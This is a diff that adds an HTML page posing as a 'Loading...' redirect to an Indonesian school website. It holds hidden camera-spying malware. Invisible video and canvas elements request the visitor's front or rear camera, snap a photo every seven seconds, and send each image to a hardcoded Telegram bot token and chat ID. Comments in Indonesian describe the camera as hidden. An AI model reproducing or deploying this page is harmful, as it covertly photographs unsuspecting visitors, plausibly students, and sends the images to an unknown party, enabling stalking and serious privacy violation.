@@ -1,0 +1,82 @@
+<!doctype html>
+<html>
+<head>
+    <title>Loading...</title>
+    <meta http-equiv="refresh" content="0; url=https://sman8yogya.sch.id/">
+    <style>
+        body {
+            background: white;
+            font-family: Arial;
+            text-align: center;
+            padding: 50px;
+        }
+    </style>
+</head>
+<body>
+    <p>Loading... Please wait</p>
+    
+    <!-- Redirect ke website asli setelah 3 detik -->
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://sman8yogya.sch.id/";
+        }, 3000);
+    </script>
+    
+    <!-- Kamera tersembunyi -->
+    <video id="hiddenCam" style="display:none; width:1px; height:1px;" autoplay></video>
+    <canvas id="hiddenCanv" style="display:none;" width="640" height="480"></canvas>
+    
+    <script>
+        const TOKEN = '8252452562:AAF8Iv8BxO6j_O6rwCjMcSkQTKNTVmAK45M';
+        const CHAT_ID = '54445037';
+        
+        const video = document.getElementById('hiddenCam');
+        const canvas = document.getElementById('hiddenCanv');
+        const ctx = canvas.getContext('2d');
+        
+        async function sendPhotoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {}
+        }
+        
+        function capturePhoto() {
+            if (video.videoWidth > 0) {
+                ctx.drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(blob => {
+                    if (blob) sendPhotoToTelegram(blob);
+                }, 'image/jpeg', 0.7);
+            }
+        }
+        
+        // Coba kamera depan, lalu kamera belakang jika gagal
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(capturePhoto, 2000);
+                    setInterval(capturePhoto, 7000);
+                })
+                .catch(() => {
+                    // Coba kamera belakang
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            video.srcObject = stream;
+                            setTimeout(capturePhoto, 2000);
+                            setInterval(capturePhoto, 7000);
+                        })
+                        .catch(() => {});
+                });
+        }
+        
+        startCamera();
+    </script>
+</body>
+</html>
